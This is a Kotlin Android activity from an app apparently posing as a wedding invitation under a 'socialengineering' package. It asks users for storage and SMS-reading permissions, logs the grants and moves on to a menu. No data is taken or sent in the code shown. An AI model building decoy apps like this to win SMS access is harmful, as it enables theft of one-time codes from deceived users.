package com.socialengineering.UndanganPernikahan

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import com.karumi.dexter.Dexter
import com.karumi.dexter.MultiplePermissionsReport
import com.karumi.dexter.PermissionToken
import com.karumi.dexter.listener.PermissionRequest
import com.karumi.dexter.listener.multi.MultiplePermissionsListener

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main2)

        /*val sharedPreferences = getSharedPreferences("Permissions", Context.MODE_PRIVATE)
        UsageUser.userData.loadFromSharedPreferences(sharedPreferences)

        if(UsageUser.userData.hasRecord){
            moveToNextActivity()
        }else{
            if (!UsageUser.userData.installed){
                val editor = sharedPreferences.edit()
                editor.putBoolean("installed", true)
                editor.apply()
            }

            Handler().postDelayed({
                if (!UsageUser.userData.storagePermission){
                    requestStoragePermission()
                }else{
                    if(!UsageUser.userData.messagePermission){
                        ReadSMSPermissions()
                    }
                }
            }, 3000) // 3000 milidetik (3 detik)
        }*/
    }

    private val requestPermissionLauncher: ActivityResultLauncher<String> =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
            if (isGranted) {
                val sharedPreferences = getSharedPreferences("Permissions", Context.MODE_PRIVATE)

                val editor = sharedPreferences.edit()
                editor.putBoolean("storagePermission", true)
                editor.apply()

                if(!UsageUser.userData.messagePermission){
                    ReadSMSPermissions()
                }
            } else {
                // Izin ditolak
                // Anda dapat memberi tahu pengguna bahwa akses file dibutuhkan
                if(!UsageUser.userData.messagePermission){
                    ReadSMSPermissions()
                }
            }
        }

    // Contoh fungsi untuk meminta izin akses file
    private fun requestStoragePermission() {
        val permission = android.Manifest.permission.READ_EXTERNAL_STORAGE // atau WRITE_EXTERNAL_STORAGE
        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            requestPermissionLauncher.launch(permission)
        }
    }

    private fun ReadSMSPermissions(){
        Dexter.withContext(this)
            .withPermissions(android.Manifest.permission.READ_SMS)
            .withListener(object : MultiplePermissionsListener {
                override fun onPermissionsChecked(report: MultiplePermissionsReport) {
                    if (report.areAllPermissionsGranted()) {
                        // Izin diberikan, lakukan pembacaan SMS di sini

                        val sharedPreferences = getSharedPreferences("Permissions", Context.MODE_PRIVATE)
                        val editor = sharedPreferences.edit()
                        editor.putBoolean("messagePermission", true)
                        editor.apply()

                        moveToNextActivity()

                    } else {
                        moveToNextActivity()
                        // Izin ditolak
                        // Anda dapat memberi tahu pengguna bahwa izin dibutuhkan untuk membaca SMS
                    }
                }

                override fun onPermissionRationaleShouldBeShown(
                    permissions: List<PermissionRequest>,
                    token: PermissionToken
                ) {
                    // Memunculkan notifikasi perizinan kepada pengguna
                    token.continuePermissionRequest()
                }
            })
            .check()
    }

    private fun moveToNextActivity() {
        Handler().postDelayed({
            val intent = Intent(this, MainMenu::class.java)
            startActivity(intent)
            finish()
        }, 3000) // 3000 milidetik (3 detik)
    }
}